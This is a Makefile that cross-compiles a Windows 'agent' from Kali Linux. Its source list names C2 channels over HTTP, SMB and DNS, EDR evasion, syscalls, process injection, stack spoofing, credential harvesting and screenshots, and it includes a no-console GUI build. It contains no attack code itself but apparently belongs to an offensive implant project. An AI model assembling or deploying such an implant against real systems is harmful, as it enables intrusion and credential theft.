# Makefile for cross-compiling the C agent from Linux (Kali) using MinGW-w64.
#
# Usage:
#   make              — build x64 agent
#   make ARCH=x86     — build x86 agent
#   make clean        — remove build artifacts

CC_x64  = x86_64-w64-mingw32-gcc
CC_x86  = i686-w64-mingw32-gcc
STRIP_x64 = x86_64-w64-mingw32-strip
STRIP_x86 = i686-w64-mingw32-strip

ARCH ?= x64
CC = $(CC_$(ARCH))
STRIP = $(STRIP_$(ARCH))

SRCDIR  = src
INCDIR  = include
OUTDIR  = build

SRCS = $(SRCDIR)/main.c \
       $(SRCDIR)/protocol.c \
       $(SRCDIR)/crypto.c \
       $(SRCDIR)/channel_http.c \
       $(SRCDIR)/channel_smb.c \
       $(SRCDIR)/channel_dns.c \
       $(SRCDIR)/channel_mgr.c \
       $(SRCDIR)/modules.c \
       $(SRCDIR)/utils.c \
       $(SRCDIR)/coff_loader.c \
       $(SRCDIR)/beacon_api.c \
       $(SRCDIR)/assembly_loader.c \
       $(SRCDIR)/evasion_loadtime.c \
       $(SRCDIR)/evasion_runtime.c \
       $(SRCDIR)/evasion_postex.c \
       $(SRCDIR)/syscalls.c \
       $(SRCDIR)/syscalls_wrappers.c \
       $(SRCDIR)/inject.c \
       $(SRCDIR)/fork_run.c \
       $(SRCDIR)/memory_cleanup.c \
       $(SRCDIR)/stack_spoof.c \
       $(SRCDIR)/api_resolve.c \
       $(SRCDIR)/pe_stomp.c \
       $(SRCDIR)/postex_loader.c \
       $(SRCDIR)/token_evasion.c \
       $(SRCDIR)/socks_proxy.c \
       $(SRCDIR)/portscan.c \
       $(SRCDIR)/screenshot.c \
       $(SRCDIR)/registry_ops.c \
       $(SRCDIR)/net_enum.c \
       $(SRCDIR)/cred_harvest.c

CFLAGS  = -I$(INCDIR) -Wall -Wextra -Os -s \
          -fno-asynchronous-unwind-tables -fno-ident \
          -fno-omit-frame-pointer \
          -DWIN32_LEAN_AND_MEAN -D_WIN32_WINNT=0x0603

LDFLAGS = -lbcrypt -lwinhttp -ladvapi32 -lkernel32 -luser32 -lntdll -ldnsapi \
          -lole32 -loleaut32 -liphlpapi -lws2_32 -lgdi32 -lcredui \
          -static-libgcc -Wl,--subsystem,console

TARGET  = $(OUTDIR)/agent.exe

.PHONY: all clean

all: $(OUTDIR) $(TARGET)
	@echo "[*] Built $(TARGET) ($(ARCH))"

$(OUTDIR):
	mkdir -p $(OUTDIR)

$(TARGET): $(SRCS)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
	$(STRIP) $@
	@ls -la $@

# GUI subsystem (no console window)
gui: $(OUTDIR) $(SRCS)
	$(CC) $(CFLAGS) -o $(OUTDIR)/agent_gui.exe $(SRCS) $(LDFLAGS) -Wl,--subsystem,windows -DAGENT_GUI
	$(STRIP) $(OUTDIR)/agent_gui.exe

clean:
	rm -rf $(OUTDIR)
